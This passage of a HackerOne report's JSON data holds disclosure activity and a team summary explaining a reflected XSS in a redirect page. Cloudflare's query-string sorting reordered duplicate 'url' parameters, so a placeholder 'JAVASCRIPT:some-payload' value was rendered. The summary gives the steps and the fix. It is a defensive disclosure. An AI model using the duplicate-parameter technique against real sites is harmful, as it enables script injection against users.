actor_is_concealed_member":false},{"id":2190158,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-29T23:57:43.835Z","updated_at":"2017-11-29T23:57:43.835Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2190180,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-30T00:21:57.752Z","updated_at":"2017-11-30T00:21:57.752Z","additional_data":{"old_title":"Redirection filter bypass leading to XSS","new_title":"Query parameter reordering causes redirect page to render unsafe URL"},"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2190460,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oh? I see thanks @jobert  and also @nahamsec for handling my report it was very awesome experience :-)\n\nThank you for the bounty!","markdown_message":"\u003cp\u003eOh? I see thanks \u003ca href=\"/jobert\"\u003e@jobert\u003c/a\u003e  and also \u003ca href=\"/nahamsec\"\u003e@nahamsec\u003c/a\u003e for handling my report it was very awesome experience :-)\u003c/p\u003e\n\n\u003cp\u003eThank you for the bounty!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-30T06:09:00.357Z","updated_at":"2017-11-30T06:09:00.357Z","actor":{"username":"kenziy","cleared":true,"url":"/kenziy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/P1WN19AW2EesQFLDQpD3Sp4o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2190461,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-30T06:09:18.796Z","updated_at":"2017-11-30T06:09:18.796Z","actor":{"username":"kenziy","cleared":true,"url":"/kenziy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/P1WN19AW2EesQFLDQpD3Sp4o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2190462,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-30T06:09:18.912Z","updated_at":"2017-11-30T06:09:18.912Z","actor":{"username":"kenziy","cleared":true,"url":"/kenziy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/P1WN19AW2EesQFLDQpD3Sp4o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2190481,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"guys is this valid for swag? :-)","markdown_message":"\u003cp\u003eguys is this valid for swag? :-)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-30T06:34:21.367Z","updated_at":"2017-11-30T06:34:21.367Z","actor":{"username":"kenziy","cleared":true,"url":"/kenziy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/P1WN19AW2EesQFLDQpD3Sp4o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":5986,"category":"team","content":"@kenziy found a reflected Cross-Site Scripting (XSS) vulnerability that was exploitable in Internet Explorer due to the CSP being ignored. The root cause of the vulnerability was rather interesting. In production, we had \"Query String Sort\" enabled in the Cloudflare caching settings. This is why we couldn't reproduce the same behavior in our local development environments. When Cloudflare sorted the `url` parameters, it placed the last `url` parameter (with the XSS payload) first because `J` (capital) comes before the `h` in the ASCII table. We noticed that the application load balancer (ALB) on AWS received the attributes in ascending order. The reason why this recently became a vulnerability, is because the app is now rendering the external link warning in React. Here's a step-by-step description what happened:\n\n1. user submits request with `url=http://test.com` and `url=JAVASCRIPT:some-payload` (in that order)\n2. Cloudflare reorders the parameters to `url=JAVASCRIPT:some-payload` and `url=http://test.com`\n3. ALB and nginx dispatch the request to unicorn\n4. unicorn uses the last `url` in the parameter, which matches the passed signature in the URL\n5. unicorn responds with a 200 OK and renders a container to load the React application\n6. React grabs the `url` from the query parameters, which, for the browser, is still `url=JAVASCRIPT:some-payload`, not `url=http://test.com`\n7. React parses the URL and renders the XSS payload\n\nThe vulnerability was addressed by disabling the setting in Cloudflare. We want to thank @kenziy for bringing this to our attention, this was a great find!","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003e\u003ca href=\"/kenziy\"\u003e@kenziy\u003c/a\u003e found a reflected Cross-Site Scripting (XSS) vulnerability that was exploitable in Internet Explorer due to the CSP being ignored. The root cause of the vulnerability was rather interesting. In production, we had \u0026quot;Query String Sort\u0026quot; enabled in the Cloudflare caching settings. This is why we couldn\u0026#39;t reproduce the same behavior in our local development environments. When Cloudflare sorted the \u003ccode\u003eurl\u003c/code\u003e parameters, it placed the last \u003ccode\u003eurl\u003c/code\u003e parameter (with the XSS payload) first because \u003ccode\u003eJ\u003c/code\u003e (capital) comes before the \u003ccode\u003eh\u003c/code\u003e in the ASCII table. We noticed that the application load balancer (ALB) on AWS received the attributes in ascending order. The reason why this recently became a vulnerability, is because the app is now rendering the external link warning in React. Here\u0026#39;s a step-by-step description what happened:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003euser submits request with \u003ccode\u003eurl=http://test.com\u003c/code\u003e and \u003ccode\u003eurl=JAVASCRIPT:some-payload\u003c/code\u003e (in that order)\u003c/li\u003e\n\u003cli\u003eCloudflare reorders the parameters to \u003ccode\u003eurl=JAVASCRIPT:some-payload\u003c/code\u003e and \u003ccode\u003eurl=http://test.com\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eALB and nginx dispatch the request to unicorn\u003c/li\u003e\n\u003cli\u003eunicorn uses the last \u003ccode\u003eurl\u003c/code\u003e in the parameter, which matches the passed signature in the URL\u003c/li\u003e\n\u003cli\u003eunicorn responds with a 200 OK and renders a container to load the React application\u003c/li\u003e\n\u003cli\u003eReact grabs the \u003ccode\u003eurl\u003c/code\u003e from the query parameters, which, for the browser, is still \u003ccode\u003eurl=JAVASCRIPT:some-payload\u003c/code\u003e, not \u003ccode\u003eurl=http://test.com\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eReact parses the URL and renders the XSS payload\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThe vulnerability was addressed by disabling the setting in Cloudflare. We want to thank \u003ca href=\"/kenziy\"\u003e@kenziy\u003c/a\u003e for bringing this to our attention, this was a great find!\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}